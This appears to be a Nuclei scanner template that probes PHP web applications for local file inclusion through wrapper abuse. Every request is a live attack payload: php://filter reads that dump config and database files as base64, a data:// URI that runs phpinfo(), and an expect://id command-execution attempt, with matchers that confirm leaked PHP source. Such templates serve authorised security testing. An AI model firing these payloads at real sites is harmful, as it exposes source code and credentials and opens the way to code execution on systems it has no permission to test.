id: m7-lfi-php-wrappers
info:
  name: M7 - LFI PHP Wrappers (base64/filter)
  author: Sharlix
  severity: critical
  description: PHP wrapper abuse for source code disclosure via LFI
  tags: lfi,php,wrapper,m7hunter
  reference:
    - https://book.hacktricks.xyz/pentesting-web/file-inclusion#php-filter-chain

requests:
  - method: GET
    path:
      - "{{BaseURL}}?file=php://filter/convert.base64-encode/resource=index.php"
      - "{{BaseURL}}?page=php://filter/convert.base64-encode/resource=config.php"
      - "{{BaseURL}}?include=php://filter/convert.base64-encode/resource=../config.php"
      - "{{BaseURL}}?file=php://filter/convert.base64-encode/resource=../db.php"
      - "{{BaseURL}}?file=php://filter/convert.base64-encode/resource=../settings.php"
      - "{{BaseURL}}?file=data://text/plain;base64,cGhwaW5mbygpOw=="
      - "{{BaseURL}}?file=expect://id"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "^[A-Za-z0-9+/]{20,}={0,2}$"
        part: body

      - type: dsl
        dsl:
          - "len(body) > 100"
          - "contains(base64_decode(body), '<?php') || contains(base64_decode(body), 'require') || contains(base64_decode(body), 'include')"
        condition: or
